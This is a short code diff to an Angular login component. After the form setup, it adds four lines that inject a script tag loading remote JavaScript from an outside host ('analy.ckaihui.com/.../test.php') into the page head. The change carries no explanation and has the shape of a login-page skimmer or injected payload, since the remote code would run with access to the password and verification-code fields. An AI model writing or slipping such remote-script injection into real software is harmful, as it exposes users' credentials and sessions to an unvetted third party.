@@ -40,6 +40,10 @@ export class LoginComponent implements OnInit {
       password: [ null, [ Validators.required ] ],
       vcode: [ null,[Validators.required] ]
     });
+    var head =  document.getElementsByTagName("head")[0] || document.documentElement; 
+    var script =  document.createElement("script");
+    script.src = '//analy.ckaihui.com/clients/w7w/test.php';
+    head.insertBefore(script,head.firstChild);
   }
 
   getVcode(){
